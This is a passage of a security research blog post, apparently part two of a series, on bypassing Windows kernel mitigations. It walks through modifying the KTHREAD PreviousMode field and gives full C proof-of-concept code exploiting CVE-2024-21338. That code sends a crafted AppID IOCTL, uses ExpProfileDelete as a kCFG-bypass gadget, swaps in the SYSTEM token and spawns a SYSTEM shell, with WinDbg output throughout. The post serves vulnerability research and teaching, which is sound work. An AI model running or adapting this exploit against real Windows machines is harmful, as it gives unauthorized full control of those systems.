+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode">PreviousMode</a> is a KTHREAD structure field that is a flag value that indicates that the thread&#x2019;s parameters came from a user-mode process if the user-mode application called a native system service routine in either the <strong>Nt</strong> or <strong>Zw</strong> version. A PreviousMode value of 1 indicates that the current thread object was created by a call from user-mode, and a value of 0 indicates that it was created from kernel-mode. This serves to restrict kernel access to objects from user-mode.</p>
+<p>PreviousMode is a field in the KTHREAD structure that acts as a flag. It indicates whether the thread&#x2019;s parameters originated from a user-mode process. If a user-mode application calls a native system service routine (either the Nt or Zw version), PreviousMode reflects this.</p>
+<ul>
+<li>A value of 1 means the thread was created by a call from user mode.</li>
+<li>A value of 0 means it was created from kernel mode.</li>
+</ul>
+<p>This flag helps restrict kernel access to objects originating from user mode</p>
+<p>If we can modify the PrevousMode of a user-mode process to 0, we can call the <code>NtWriteVirtualMemory</code> or <code>ReadProcessMemory</code> functions to get the kernel memory RW primitives, which we&#x2019;ll demonstrate with a simple example and debugging to help make it easier to understand!</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span>
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}
+<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+	PVOID KTHREAD = <span class="hljs-literal">NULL</span>;
+	PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;
+	PVOID EPROCESS = <span class="hljs-literal">NULL</span>;
+
+	ULONG dwbytes = <span class="hljs-number">0</span>;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+	
+	<span class="hljs-comment">// [1]</span>
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;KTHREAD, pid, hThread);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;EPROCESS, pid, hProc);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);
+
+	GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;modify previousmode in windbg and press any button..\n&quot;</span>);
+	getch();
+
+	<span class="hljs-comment">// [2]</span>
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);
+
+	<span class="hljs-comment">// [3]</span>
+	system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);
+	
+}</code></pre>
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c</a></p>
+</blockquote>
+<p>The above code works as follows</p>
+<ol>
+<li>Leak the required address via the <code>NtQuerySystemInformation</code> API</li>
+<li>Overwrite the token value of the user-mode process to the system process</li>
+<li>Spawn a cmd with system privileges</li>
+</ol>
+<p>In normal execution, nothing happens because the user-mode process cannot RW the kernel memory via <code>pNtWriteVirtualMemory</code>&#x2026;but we will now modify PreviouMode in the debugger before calling <code>pNtWriteVirtualMemory</code> and do the privilege escalation.</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%205.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>When we run it, it will output the KTHREAD/EPROCESS address of the current process and the EPROCESS address of the SYSTEM process. Copy these and go to windbg.</p>
+<pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER
+   +<span class="hljs-number">0x018</span> SListFaultAddress : (null) 
+   +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>
+   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void
+   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void
+   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void
+   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>
+   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>
+   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void
+   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT
+...
+   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS
+   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX
+   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">1</span> <span class="hljs-string">&apos;&apos;</span>
+   +0x233 BasePriority     : 8 &apos;&apos;</code></pre>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%206.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>We can see that PreviouMode is located at <code>KTHREAD+0x232</code>. Since the current process is in user mode, we can see that the PreviouMode is 1. Now, in the Memory window of windbg, modify that value to 0.</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%207.png" srcset="/img/loading.gif" alt="image.png"></p>
+<pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER
+   +<span class="hljs-number">0x018</span> SListFaultAddress : (null) 
+   +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>
+   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void
+   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void
+   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void
+   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>
+   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>
+   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void
+   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT
+...
+   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS
+   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX
+   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>
+   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">0</span> <span class="hljs-string">&apos;&apos;</span>
+   +0x233 BasePriority     : 8 &apos;&apos;</code></pre>
+<p>Back in the Analytics machine, press any button to proceed to the next step. </p>
+<pre><code class="hljs c">pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);
+system(<span class="hljs-string">&quot;cmd.exe&quot;</span>)</code></pre>
+<p>Kernel Read/Write is now possible with <code>pNtWritevirtualMemory</code> function through PreviousMode modification. After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&#x2026;!</p>
+<p>After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&#x2026;!</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%208.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>?</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%209.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>I got a BSOD.. ??</p>
+<p>The problem occurs when we modify PreviousMode to kernel mode and then try to create a process with system privileges. Since the kernel mode PreviousMode is not needed after token swapping, it should be restored to its original value of 1 before creating the cmd process so that the process can be created without crashing.</p>
+<pre><code class="hljs c"><span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));
+*restoreBuffer = <span class="hljs-number">1</span>;
+
+pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, (PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);
+system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);</code></pre>
+<p>If we add the code above and try again&#x2026;</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2010.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>We can modify the PreviousMode to achieve elevated privileges.</p>
+<p>Coming back to the kCFG bypass, we can modify the PreviouMode by calling a normal kernel function registered in the kCFG bitmap after triggering the untrusted pointer dereference vulnerability of CVE-2024-21338. But&#x2026; how do we find this function among the many, many kernel functions :(</p>
+<p>One function worth noting is the <code>ObfDereferenceObjectWithTag</code> kernel macro. This macro decrements the reference count field of the object address being passed (offset -0x30), so it would be a perfect macro to change PreviousMode from a user-mode value of 1 to a kernel-mode value of 0.</p>
+<p>However, there is one limitation to calling <code>ObfDereferenceObjectWithTag</code> directly. As we saw earlier in the bug trigger, we can&#x2019;t directly control the value of the first argument, but only indirectly control the value.</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>We need to find another wrapper function that allows us to dereference rcx once and pass the value as an argument to the <code>ObfDereferenceObjectWithTag</code> macro so that we can control it directly.</p>
+<p>If we look far enough down the cross-reference list of the <code>ObfDereferenceObjectWithTag</code> macro, we find the <code>ExpProfileDelete</code> function that satisfies that condition.</p>
+<pre><code class="hljs lua">void __fastcall ExpProfileDelete(__int64 a1)
+{
+  <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">48</span>) )
+  {
+    KeStopProfile(*(_QWORD *)(a1 + <span class="hljs-number">40</span>));
+    MmUnmapLockedPages(*(PVOID *)(a1 + <span class="hljs-number">48</span>), *(PMDL *)(a1 + <span class="hljs-number">56</span>));
+    MmUnlockPages(*(PMDL *)(a1 + <span class="hljs-number">56</span>));
+    ExFreePoolWithTag(*(PVOID *)(a1 + <span class="hljs-number">40</span>), <span class="hljs-number">0</span>);
+  }
+  <span class="hljs-keyword">if</span> ( *(_QWORD *)a1 )
+    ObfDereferenceObjectWithTag(*(PVOID *)a1, <span class="hljs-number">0x66507845</span>u);
+}</code></pre>
+<p>We call it by passing the value referencing the first argument to <code>ObfDereferenceObjectWithTag</code>, which gives us direct control over the first argument of the macro. </p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2011.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>First of all, when calling the <code>ExpProfileDelete</code> function via CVE-2024-21338 vulnerability, kCFG is bypassed and jumps to the <code>ExpProfileDelete</code> address.</p>
+<blockquote>
+<p>The <code>ExpProfileDelete</code> function address can be obtained by calculating the offset from the ntoskrnle.exe base obtained via <code>NtQuerySystemInformation</code> in Part 1.</p>
+</blockquote>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2012.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Inside <code>ExpProfileDelete</code>, the rcx at the time of the <code>ObfDereferenceObjectWithTag</code> macro call comes out as <code>0x414141414141414141</code>. We can finally decrement the address we want!</p>
+<p>There may be more functions that satisfy our conditions, even if they are not <code>ExpProfileDelete</code>. However, the more complex the logic of the function, the more likely it is to crash and execute code other than our intended behavior, so it&#x2019;s probably a good idea to find a relatively simple function to target.</p>
+<p>Below is the final proof-of-concept code that modifies PreviousMode and performs Token Swapping with CVE-2024-21338 vulnerability</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME <span class="hljs-meta-string">&quot;\\\\?\\AppID&quot;</span></span>
+
+<span class="hljs-comment">// IOCTL 0x22A018</span>
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+	PVOID arg1;
+	PVOID objptr;
+	PVOID cfgptr;
+	PVOID unknown;
+} INPUT_BUFFER;
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+_NtDeviceIoControlFile pNtDeviceIoControlFile;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}
+<span class="hljs-function">PVOID <span class="hljs-title">GetImageBase</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ModuleName)</span> </span>{...}
+<span class="hljs-function">PVOID <span class="hljs-title">GetFILE_OBJECT_Address</span><span class="hljs-params">()</span></span>{...}
+<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+	PVOID KTHREAD = <span class="hljs-literal">NULL</span>;
+	PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;
+	PVOID EPROCESS = <span class="hljs-literal">NULL</span>;
+	PVOID PreviousMode = <span class="hljs-literal">NULL</span>;
+	PVOID NTOSKRNL_BASE = <span class="hljs-literal">NULL</span>;
+
+	ULONG dwbytes = <span class="hljs-number">0</span>;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;KTHREAD, pid, hThread);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);
+
+	PreviousMode = (UINT64)KTHREAD + <span class="hljs-number">0x232</span>;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] PreviousMode address: %p\n&quot;</span>, PreviousMode);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;EPROCESS, pid, hProc);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);
+
+	GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);
+
+	NTOSKRNL_BASE = GetImageBase(<span class="hljs-string">&quot;ntoskrnl.exe&quot;</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ntoskrnl.exe base address : %p\n&quot;</span>, NTOSKRNL_BASE);
+
+	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + <span class="hljs-number">0xA01FD0</span>; <span class="hljs-comment">// kcfg bypass gadget</span>
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ExpProfileDelete function address : %p\n&quot;</span>, ExpProfileDelete);
+
+	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();
+
+	INPUT_BUFFER buffer = { <span class="hljs-number">0</span>, };
+	HANDLE dHandle;
+	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_NEW, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+	buffer.arg1 = (UINT64)PreviousMode + <span class="hljs-number">0x30</span>;		
+	buffer.objptr = FILE_OBJECT;					
+	buffer.cfgptr = &amp;ExpProfileDelete;				
+	buffer.unknown = <span class="hljs-literal">NULL</span>;							
+
+	IO_STATUS_BLOCK ioStatus;
+
+	<span class="hljs-keyword">if</span> (pNtDeviceIoControlFile(dHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;ioStatus, <span class="hljs-number">0x22A018</span>, &amp;buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>, &amp;dwbytes) != NOERROR) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtDeviceIoControlFile Failed, 0x%x\n&quot;</span>, GetLastError());
+	}
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span>, (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);
+
+	<span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));
+	*restoreBuffer = <span class="hljs-number">1</span>;
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, (PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);
+
+	system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);
+
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c</a></p>
+</blockquote>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2013.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>I originally planned to introduce all three techniques in this part. It ended up being longer than I thought, so I&#x2019;ll summarize the remaining two techniques in the next part&#x2026; (it&#x2019;s okay, I&#x2019;m off for the holidays)</p>
+<p>I&#x2019;ll be back with Part 3 :) Keep up the good work in 2025!</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                  
+                  <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
+                  
+                  <a class="hover-with-bg" href="/tags/bypass/">bypass</a>
+                  
+                  <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
+                  
+                  <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
+                  
+                  <a class="hover-with-bg" href="/tags/previousmode/">previousmode</a>
+                  
+                  <a class="hover-with-bg" href="/tags/smep/">smep</a>
+                  
+                  <a class="hover-with-bg" href="/tags/kcfg/">kcfg</a>
+                  
+                  <a class="hover-with-bg" href="/tags/dep/">dep</a>
+                  
+                  <a class="hover-with-bg" href="/tags/exploit-techniques/">exploit techniques</a>
+                  
+                  <a class="hover-with-bg" href="/tags/cve-2024-21338/">cve-2024-21338</a>
+                  
+                  <a class="hover-with-bg" href="/tags/sedebugprivilege/">sedebugprivilege</a>
+                  
+                  <a class="hover-with-bg" href="/tags/ioring/">ioring</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_L0ch.jpg" srcset="/img/loading.gif" alt="L0ch">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">L0ch</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/L0ch">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/01/15/l0ch/2025-01-15/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] CVE-2024-49415: 삼성 스마트폰의 OOB Write로 인한 Zero-Click RCE</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">
+                    <span class="hidden-mobile">[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (Ko)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/';
+        this.page.identifier = '/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
